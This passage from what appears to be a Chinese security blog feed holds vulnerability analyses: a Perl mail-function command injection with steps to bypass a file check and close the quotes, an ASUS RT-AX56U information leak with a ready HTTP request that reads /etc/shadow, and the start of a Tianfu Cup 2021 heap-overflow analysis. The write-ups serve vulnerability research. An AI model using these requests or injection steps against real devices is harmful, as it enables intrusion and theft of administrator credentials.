class="string">&quot;$strSubject&quot;</span>,<span class="string">&quot;toEmail&quot;</span>=&gt;<span class="string">&quot;$mailTo&quot;</span>,<span class="string">&quot;attachmentfile&quot;</span>=&gt;<span class="string">&quot;$file&quot;</span>,<span class="string">&quot;smtpserverhost&quot;</span>=&gt;<span class="string">&quot;$mailServerHost&quot;</span>,<span class="string">&quot;fromaddress&quot;</span>=&gt;<span class="string">&quot;$mailFrom&quot;</span>);</span><br><span class="line">	&lt;<span class="regexp">/code&gt;</span></span><br><span class="line"><span class="regexp">	</span></span><br><span class="line"><span class="regexp">        out = OPCODE mail_sender json %mailreq</span></span><br><span class="line"><span class="regexp">        /</span><span class="regexp">/ ...</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">    /</span>/ ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>代码中首先判断 release 参数是否为空，然后对其进行 base64 解码，以 $&#x3D; 将字符串分割，获取 hdnDestDomain、hdnSender、hdnRecipient、hdnFilePath 四个参数并赋值到不同的变量。</p>
<p>接着利用正则表达式过滤 hdnRecipient 和 hdnSender 参数，验证邮箱格式是否正确，不正确直接返回 500 错误。</p>
<p>如果验证通过，就调用 LOG 打印这些变量的内容，然后利用 -e 判断 $file 即 $QUARANTINE_PATH.”&#x2F;“.$requestData{hdnFilePath} 文件是否存在，其中 $QUARANTINE_PATH 是一个常量，定义为 &#x2F;var&#x2F;quarantine。</p>
<p>如果文件存在，就调用 mail_sender 函数</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line">OPCODE mail_sender&#123;</span><br><span class="line">    <span class="regexp">//</span> ...</span><br><span class="line">    LOG applog <span class="string">&quot;MAIL_SEND: Values--&gt;\n Mail Server: --&gt; $smtpserverhost\n Mail From: --&gt; $fromaddress\n Mail To: --&gt; $toEmail\n Subject: --&gt; $subject\n Username: --&gt; $mailusername\n MailAction:--&gt; $mailaction\n SMTPSecurityMode:--&gt; $smtpsecuritymode\n SMTPCertificate:--&gt;$smtpcertificate\n Appliance IP(LAN):--&gt; $ip\n&quot;</span></span><br><span class="line">	IF(<span class="string">&quot;$mailaction eq $MAIL_WITH_VAR&quot;</span>)&#123;</span><br><span class="line">		out = EXEC /bin/cschelper <span class="string">&#x27;mail_send&#x27;</span> $fromaddress $fromaddresswithname $toEmail $toEmail $subject <span class="string">&quot;&quot;</span> $smtpserverhost $smtpserverport $mailusername $mailpassword $mailaction $smtpsecuritymode $smtpcertificate $certpassword <span class="string">&quot;1&quot;</span> <span class="string">&quot;$mailbody&quot;</span> <span class="string">&quot;text/html&quot;</span></span><br><span class="line">	&#125;ELSE IF(<span class="string">&quot;$mailaction eq $MAIL_FORWARD&quot;</span>)&#123;</span><br><span class="line">		out = EXECSH <span class="string">&quot;/bin/cschelper mail_send &#x27;$fromaddress&#x27; &#x27;$fromaddresswithname&#x27; &#x27;$toEmail&#x27; &#x27;$toEmail&#x27; &#x27;$subject&#x27; &#x27;$mailbody&#x27; &#x27;$smtpserverhost&#x27; &#x27;$smtpserverport&#x27; &#x27;$mailusername&#x27; &#x27;$mailpassword&#x27; &#x27;$mailaction&#x27; &#x27;$smtpsecuritymode&#x27; &#x27;$smtpcertificate&#x27; &#x27;$certpassword&#x27; &#x27;1&#x27; &#x27;$attachmentfile&#x27;&quot;</span></span><br><span class="line">	&#125;ELSE IF(<span class="string">&quot;$mailaction eq $MAIL_ATTACHMENT&quot;</span>)&#123;</span><br><span class="line">		out = EXECSH <span class="string">&quot;/bin/cschelper mail_send &#x27;$fromaddress&#x27; &#x27;$fromaddresswithname&#x27; &#x27;$toEmail&#x27; &#x27;$toEmail&#x27; &#x27;$subject&#x27; &#x27;$mailbody&#x27; &#x27;$smtpserverhost&#x27; &#x27;$smtpserverport&#x27; &#x27;$mailusername&#x27; &#x27;$mailpassword&#x27; &#x27;$mailaction&#x27; &#x27;$smtpsecuritymode&#x27; &#x27;$smtpcertificate&#x27; &#x27;$certpassword&#x27; &#x27;1&#x27; &#x27;$attachmentfile&#x27;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	// ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此函数头部进行很多初始化操作，随后根据 $mailaction 值的不同执行不同逻辑，在 send_mail 函数中可以看到 传入的 $mailaction 值应该是 $MAIL_FORWARD，那么这里会执行</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line">out = EXECSH <span class="string">&quot;/bin/cschelper mail_send &#x27;$fromaddress&#x27; &#x27;$fromaddresswithname&#x27; &#x27;$toEmail&#x27; &#x27;$toEmail&#x27; &#x27;$subject&#x27; &#x27;$mailbody&#x27; &#x27;$smtpserverhost&#x27; &#x27;$smtpserverport&#x27; &#x27;$mailusername&#x27; &#x27;$mailpassword&#x27; &#x27;$mailaction&#x27; &#x27;$smtpsecuritymode&#x27; &#x27;$smtpcertificate&#x27; &#x27;$certpassword&#x27; &#x27;1&#x27; &#x27;$attachmentfile&#x27;&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>EXECSH 对应的操作是 &#x2F;bin&#x2F;sh -c，同时这条命令中拼接了我们可控的 $smtpserverhost，存在命令注入漏洞。</p>
<h2 id="C-漏洞触发"><a href="#C-漏洞触发" class="headerlink" title="C. 漏洞触发"></a>C. 漏洞触发</h2><p>在触发漏洞的路径上还存在几个问题</p>
<h3 id="C-1-绕过文件判断"><a href="#C-1-绕过文件判断" class="headerlink" title="C.1 绕过文件判断"></a>C.1 绕过文件判断</h3><p>在调用 mail_sender 函数之前存在一个对 $file 是否存在的判断，其中 $file 参数是 $QUARANTINE_PATH 和用户提交的 hdnFilePath 两个变量拼接而来，也就是说只有$file 存在时，才能触发 mail_sender 功能，$QUARANTINE_PATH 变量的值为 &#x2F;var&#x2F;quarantine，而通常情况下攻击者无法得知此目录下有哪些文件。</p>
<p>为了绕过这个判断，我们可以提交 hdnFilePath&#x3D;&#x2F;，拼接后得到 $file &#x3D; &#x2F;var&#x2F;quarantine&#x2F;，而这里就变成了判断 &#x2F;var&#x2F;quarantine&#x2F; 目录是否存在，显然可以通过。</p>
<h3 id="C-2-命令注入"><a href="#C-2-命令注入" class="headerlink" title="C.2 命令注入"></a>C.2 命令注入</h3><p>在注入命令的时候，相关代码如下</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line">ELSE IF(<span class="string">&quot;$mailaction eq $MAIL_FORWARD&quot;</span>)&#123;</span><br><span class="line">		out = EXECSH <span class="string">&quot;/bin/cschelper mail_send &#x27;$fromaddress&#x27; &#x27;$fromaddresswithname&#x27; &#x27;$toEmail&#x27; &#x27;$toEmail&#x27; &#x27;$subject&#x27; &#x27;$mailbody&#x27; &#x27;$smtpserverhost&#x27; &#x27;$smtpserverport&#x27; &#x27;$mailusername&#x27; &#x27;$mailpassword&#x27; &#x27;$mailaction&#x27; &#x27;$smtpsecuritymode&#x27; &#x27;$smtpcertificate&#x27; &#x27;$certpassword&#x27; &#x27;1&#x27; &#x27;$attachmentfile&#x27;&quot;</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 $smtpserverport 变量是用户可控的 hdnDestDomain，但单纯使用反引号或者分号不能执行命令，需要先使用单引号将待注入的命令闭合才可以。</p>
<h3 id="C-3-日志调试"><a href="#C-3-日志调试" class="headerlink" title="C.3 日志调试"></a>C.3 日志调试</h3><p>perl 部分没有很好的方法可以调试，但在代码中存在很多 LOG 打印日志信息，我们可以在  &#x2F;var&#x2F;tslog&#x2F;applog.log 文件中找到这些信息，通过调试信息辅助分析。</p>
<h3 id="C-4-漏洞触发演示"><a href="#C-4-漏洞触发演示" class="headerlink" title="C.4 漏洞触发演示"></a>C.4 漏洞触发演示</h3><p><a href="https://asciinema.org/a/ObglFFm6uDh6Hi8Tzrv8BjDNo"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://asciinema.org/a/ObglFFm6uDh6Hi8Tzrv8BjDNo.svg"
                      alt="asciicast"
                ></a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>RT-AX56U information disclosure vulnerability</title>
    <url>/2021/12/01/asus-info-disclosure/</url>
    <content><![CDATA[<p>2021 年 10 月 7 日，ASUS 发布了针对 RT-AX56U 等路由器的固件更新，其中修复了一个敏感信息泄露漏洞，本文对此漏洞简单分析。</p>
<span id="more"></span>

<p>固件下载链接：<a class="link"   href="https://www.asus.com.cn/Networking-IoT-Servers/WiFi-Routers/ASUS-WiFi-Routers/RT-AX56U/HelpDesk_BIOS/" >RT-AX56U｜无线路由器｜ASUS 中国<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，受影响固件为 <strong>3.0.0.4.386.44266</strong> 及更早版本。</p>
<p>我们以 3.0.0.4.386.44266 为例进行分析，环境准备等操作可参考<a href="https://wzt.ac.cn/2021/11/02/TFC2021-AX56U/">前文</a>。</p>
<p>目标二进制程序：&#x2F;usr&#x2F;sbin&#x2F;httpd，这个程序负责解析设备收到的 web 请求。</p>
<p>Asus 在其路由器中使用了一些开源组件，为了遵守 GPL 开源协议，Asus 曾在其官方网站上公开了相关源代码，后续的梅林固件就是基于这份源代码进行开发，我们可以参考<a class="link"   href="https://github.com/RMerl/asuswrt-merlin.ng" >梅林<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>的源代码辅助分析。</p>
<p>通过源代码在 IDA 中定位到 sub_19644 函数，此函数用于解析用户传入的 HTTP 请求，这个函数逻辑较多，但其基本解析流程为：收到请求，进行简单的逐行解析，然后获取 URI 字段，过滤掉可能的路径穿越字符串，之后分别匹配三个 URI 对照表，判断当前请求的 URI 是否需要身份验证，以及获取对应接口的 handler 函数。</p>
<p>我们可以在 mime_handlers 全局结构体中找到相关接口定义，根据源代码相关信息，利用以下 IDAPython 脚本提取所有无需身份验证的接口</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_str</span>(<span class="params">address</span>):</span><br><span class="line">    _<span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        _temp = Byte(address)</span><br><span class="line">        address += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> _temp == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        _<span class="built_in">str</span> += <span class="built_in">chr</span>(_temp)</span><br><span class="line">    <span class="keyword">return</span> _<span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_auth</span>(<span class="params">address</span>):</span><br><span class="line">    _address = address + <span class="number">20</span></span><br><span class="line">    _tmp = Dword(_address)</span><br><span class="line">    <span class="keyword">if</span> _tmp == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_handler</span>(<span class="params">address</span>):</span><br><span class="line">    _address = address + <span class="number">16</span></span><br><span class="line">    _tmp = Dword(_address)</span><br><span class="line">    <span class="keyword">return</span> _tmp</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x0009BAC4</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    _<span class="built_in">str</span> = get_str(Dword(address))</span><br><span class="line">    _auth = check_auth(address)</span><br><span class="line">    _handler = get_handler(address)</span><br><span class="line">    <span class="keyword">if</span> _auth == <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(_<span class="built_in">str</span>, <span class="built_in">hex</span>(_handler))</span><br><span class="line">    address += <span class="number">0x18</span></span><br><span class="line">    <span class="keyword">if</span> Dword(address) &lt; <span class="number">0x70000</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p>分析接口逻辑，当访问 .htm 等静态资源时，会执行 sub_1C3B8 函数，代码片段1：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v5 = cgi_get_0(<span class="string">&quot;current_lang&quot;</span>, v78, v4);</span><br><span class="line"><span class="keyword">if</span> ( !v5 )</span><br><span class="line">    v5 = v3;</span><br><span class="line">v70 = sub_1B420(v5, &amp;unk_A13A0) == <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<p>由于需要支持多语言，这段代码会尝试获取用户提交的 current_lang 参数，然后传入 sub_1B420 函数，代码片段2：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_1B420</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *current_lang, _DWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *v3; <span class="comment">// r7</span></span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">signed</span> <span class="type">int</span> v5; <span class="comment">// r5</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// r9</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 *v7; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 *v8; <span class="comment">// r6</span></span><br><span class="line">    <span class="type">int</span> v9; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 *v10; <span class="comment">// r3</span></span><br><span class="line">    <span class="type">int</span> v11; <span class="comment">// r9</span></span><br><span class="line">    <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">int</span> v13; <span class="comment">// r2</span></span><br><span class="line">    <span class="type">int</span> v14; <span class="comment">// t1</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// r3</span></span><br><span class="line">    <span class="type">int</span> v16; <span class="comment">// r1</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 *v17; <span class="comment">// r2</span></span><br><span class="line">    <span class="type">char</span> v18[<span class="number">16</span>]; <span class="comment">// [sp+0h] [bp-38h] BYREF</span></span><br><span class="line">    <span class="type">char</span> ptr; <span class="comment">// [sp+10h] [bp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( current_lang &amp;&amp; *current_lang )</span><br><span class="line">        <span class="built_in">snprintf</span>(v18, <span class="number">0x10</span>u, <span class="string">&quot;%s.dict&quot;</span>, current_lang);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">strcpy</span>(v18, <span class="string">&quot;EN.dict&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v18, byte_A0ABC) )</span><br><span class="line">    &#123;</span><br><span class="line">        sub_1B3D8(a2);</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = fopen(v18, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v3 )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            result = <span class="built_in">strcmp</span>(v18, <span class="string">&quot;EN.dict&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !result )</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            <span class="built_in">strcpy</span>(v18, <span class="string">&quot;EN.dict&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">snprintf</span>(byte_A0ABC, <span class="number">0xC</span>u, <span class="string">&quot;%s&quot;</span>, v18);</span><br><span class="line">        <span class="built_in">memset</span>(a2, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">        fseek(v3, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">        v4 = ftell(v3);</span><br><span class="line">        v5 = v4 + <span class="number">125</span>;</span><br><span class="line">        v6 = v4;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;dict_size %d\n&quot;</span>, v4 + <span class="number">125</span>);</span><br><span class="line">        v7 = <span class="built_in">malloc</span>(v5);</span><br><span class="line">        a2[<span class="number">3</span>] = v7;</span><br><span class="line">        v8 = v7;</span><br><span class="line">        fseek(v3, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        fread(&amp;ptr, <span class="number">1u</span>, <span class="number">3u</span>, v3);</span><br><span class="line">        <span class="built_in">memset</span>(a2[<span class="number">3</span>], <span class="number">0</span>, v5);</span><br><span class="line">        fread(a2[<span class="number">3</span>], <span class="number">1u</span>, v5, v3);</span><br><span class="line">        v9 = v6 + <span class="number">124</span>;</span><br><span class="line">        v10 = a2[<span class="number">3</span>];</span><br><span class="line">        v11 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ( v9 + <span class="number">1</span> &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v14 = *v10++;</span><br><span class="line">            v13 = v14;</span><br><span class="line">            <span class="keyword">if</span> ( v14 == <span class="number">10</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                ++v11;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( !v13 )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            --v9;</span><br><span class="line">        &#125;</span><br><span class="line">        a2[<span class="number">2</span>] = <span class="built_in">malloc</span>(<span class="number">4</span> * v11);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;dict_item %d\n&quot;</span>, v11);</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i != v11; ++i )</span><br><span class="line">        &#123;</span><br><span class="line">            *(a2[<span class="number">2</span>] + <span class="number">4</span> * i) = v8;</span><br><span class="line">            v17 = v8;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                v8 = v17;</span><br><span class="line">                <span class="keyword">if</span> ( v5 &lt;= <span class="number">0</span> )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                v16 = *v17++;</span><br><span class="line">                <span class="keyword">if</span> ( v16 == <span class="number">10</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    --v5;</span><br><span class="line">                    *v8++ = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( !v16 )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                --v5;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        *a2 = i;</span><br><span class="line">        fclose(v3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先将 current_lang 拼接到变量 v18 中，这里使用的是 snprintf，长度 0x10，默认会以 .dict 结尾，然后根据文件路径打开对应文件，读取其中的内容作为基本语料。</p>
<p>如果用户提交一个长度刚好等于 15 字节的数据，那么 .dict 就会被冲洗掉，后面可以打开任意文件作为基本语料，当静态内容输出时，会将这里打开的文件内容输出。(但是只能输出第一行)</p>
<p>所以我们可以构造类似如下的请求</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /error_page.htm?current_lang=/////etc/shadow HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Referer: https://127.0.0.1/Main_Login.asp</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>当此请求发送到存在漏洞的设备之后，就可以泄露出管理员用户的密码信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/asus-info-dis-1.png"
                     
                ></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>Tianfu Cup 2021 RT-AX56U RCE</title>
    <url>/2021/11/02/TFC2021-AX56U/</url>
    <content><![CDATA[<p>2021 年天府杯目标之一是 ASUS RT-AX56U V2，比赛要求选手从 LAN 侧未授权获取设备 root shell，在比赛开始前 ASUS 官方发布了数个补丁来修复漏洞，但依然有两队选手成功破解了此设备，本文将对其中涉及的相关漏洞进行分析。</p>
<span id="more"></span>

<h2 id="firmware"><a href="#firmware" class="headerlink" title="firmware"></a>firmware</h2><p>固件可从 ASUS <a class="link"   href="https://www.asus.com.cn/Networking-IoT-Servers/WiFi-Routers/ASUS-WiFi-Routers/RT-AX56U/HelpDesk_BIOS/" >官方网站<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>下载，我们以 RT-AX56U V1 设备的 <strong>3.0.0.4.386.42808</strong> 为例进行分析。</p>
<p>下载固件后 binwalk 可直接解包，得到一个标准的 Linux 文件系统，从 &#x2F;usr&#x2F;sbin 目录下找到关键文件 cfg_server</p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>为了方便分析，首先要打开设备的 ssh 服务，导航到设备后台 -&gt; 系统管理 -&gt; 系统设置 -&gt; 启用 SSH，来开启 ssh 服务。</p>
<p>通过管理员账户连接 ssh，在 &#x2F;tmp&#x2F;test 目录下准备一个 gdbserver(链接：<a class="link"   href="https://pan.baidu.com/s/1Z_1EBswZWWIX-AU6joIh_Q" >https://pan.baidu.com/s/1Z_1EBswZWWIX-AU6joIh_Q<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>  提取码：4ypa)， 可利用设备的 wget 命令从外部服务器下载到本地。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>cfg_server 二进制程序同时监听 tcp 与 udp 的 7788 端口，它实现了 WiFI Mesh 的相关功能。</p>
<p><strong>基本数据处理流程</strong></p>
<p>用 IDA 逆向分析此程序，通过 recv 函数交叉引用，可以找到名为 cm_tcpPacketHandler 的函数，读取数据部分:</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="number">0x4000</span>u);</span><br><span class="line">    v10 = read_tcp_message(v2, v21, <span class="number">0x4000</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( v10 &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( cm_packetProcess(v2, v21, v10, v19, v20, &amp;cm_ctrlBlock, v18) == <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里调用 read_tcp_message 函数读取外部输入，然后调用 cm_packetProcess 函数处理数据。</p>
<p>cm_packetProcess 逻辑较多，简单来讲，此函数希望收到符合 TLV 格式的数据，所谓 TLV 即 标识域（Tag）+ 长度域（Length）+ 值域（Value），cfg_server 对数据格式定义比较简单：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0        8        16      24       32  (bit)</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|              opcode               |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|              data_len             |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|              data_crc             |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|               data                |</span><br><span class="line">|               ...                 |</span><br><span class="line">+--------+--------+--------+--------+</span><br></pre></td></tr></table></figure></div>

<p>程序会根据 opcode 来调用不同的 handler 函数，TCP 和 UDP 端口分别对应一些 handler。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TCP</span><br><span class="line">        1 cm_processREQ_KU</span><br><span class="line">        3 cm_processREQ_NC</span><br><span class="line">        5 cm_processREP_OK</span><br><span class="line">        8 cm_processREQ_CHK</span><br><span class="line">        0xA cm_processACK_CHK</span><br><span class="line">        0xF cm_processREQ_JOIN</span><br><span class="line">        0x12 cm_processREQ_RPT</span><br><span class="line">        0x14 cm_processREQ_GKEY</span><br><span class="line">        0x17 cm_processREQ_GREKEY</span><br><span class="line">        0x19 cm_processREQ_WEVENT</span><br><span class="line">        0x1B cm_processREQ_STALIST</span><br><span class="line">        0x1D cm_processREQ_FWSTAT</span><br><span class="line">        0x22 cm_processREQ_COST</span><br><span class="line">        0x24 cm_processREQ_CLIENTLIST</span><br><span class="line">        0x26 cm_processREQ_ONBOARDING</span><br><span class="line">        0x28 cm_processREQ_GROUPID</span><br><span class="line">        0x2A cm_processACK_GROUPID</span><br><span class="line">        0x2B cm_processREQ_SREKEY</span><br><span class="line">        0x2D cm_processREQ_TOPOLOGY</span><br><span class="line">        0x2F cm_processREQ_RADARDET</span><br><span class="line">        0x31 cm_processREQ_RELIST</span><br><span class="line">        0x33 cm_processREQ_APLIST</span><br><span class="line">        0x37 cm_processREQ_CHANGED_CONFIG</span><br><span class="line">        0x39 cm_processREQ_LEVEL</span><br><span class="line">UDP</span><br><span class="line">        1 cm_processREQ_STAMON</span><br><span class="line">        2 cm_processRSP_STAMON</span><br><span class="line">        3 cm_processREQ_ACL</span><br><span class="line">        4 cm_processREQ_STAFILTER</span><br><span class="line">        7 cm_processREQ_EXAPCHECK</span><br></pre></td></tr></table></figure></div>

<p>处理数据时，先获取 opcode 字段，根据 opcode 调用不同的函数，将 data_len、data_crc、data 作为第 4、5、7 个参数传入。</p>
<p><strong>整数溢出 -&gt; 堆溢出</strong></p>
<p>相同的漏洞点位多个函数中，以其中之一为例。当 opcode &#x3D; 0x2a 时，程序调用 cm_processACK_GROUPID 函数，代码片段 1</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">if</span> ( v10 )</span><br><span class="line">&#123;</span><br><span class="line">    v13 = bswap32(data_len);</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( crc32(<span class="number">0</span>, data, v13) == bswap32(data_crc) )</span><br><span class="line">        &#123;</span><br><span class="line">            v18 = nvram_get_1(<span class="string">&quot;cfg_dbg&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v18, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">                cprintf(<span class="string">&quot;[%s(%d)]:OK\n&quot;</span>, <span class="string">&quot;cm_processACK_GROUPID&quot;</span>, <span class="number">8279</span>);</span><br><span class="line">            v19 = nvram_get_1(<span class="string">&quot;cfg_syslog&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v19, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">                asusdebuglog(<span class="number">6</span>, <span class="string">&quot;cfg_mnt.log&quot;</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;[%s(%d)]:OK\n&quot;</span>, <span class="string">&quot;cm_processACK_GROUPID&quot;</span>, <span class="number">8279</span>);</span><br><span class="line">            v20 = cm_aesDecryptMsg(v10, v10, data, v13);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>

<p>第 4 行转换 data_len 字节序，第 7 行调用 crc32 函数计算 data 部分的 CRC 值，要求得到的值和 data_crc 相同。第 16 行调用 cm_aesDecryptMsg 函数尝试解密数据。</p>
<p>代码片段2</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line">v10 = aes_decrypt(a1, data, data_len, v19);</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>

<p>cm_aesDecryptMsg  函数会调用 aes_decrypt 函数。</p>
<p>代码片段3</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v17[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">CTX = EVP_CIPHER_CTX_new();</span><br><span class="line"><span class="keyword">if</span> ( !CTX )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s(%d):Failed to EVP_CIPHER_CTX_new() !!\n&quot;</span>, <span class="string">&quot;aes_decrypt&quot;</span>, <span class="number">768</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">v9 = EVP_aes_256_ecb();</span><br><span class="line">v10 = EVP_DecryptInit_ex(CTX, v9, <span class="number">0</span>, key, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( v10 )</span><br><span class="line">&#123;</span><br><span class="line">    *a4 = <span class="number">0</span>;</span><br><span class="line">    v11 = EVP_CIPHER_CTX_block_size(CTX) + data_len;</span><br><span class="line">    v12 = <span class="built_in">malloc</span>(v11);</span><br><span class="line">    v10 = v12;</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">     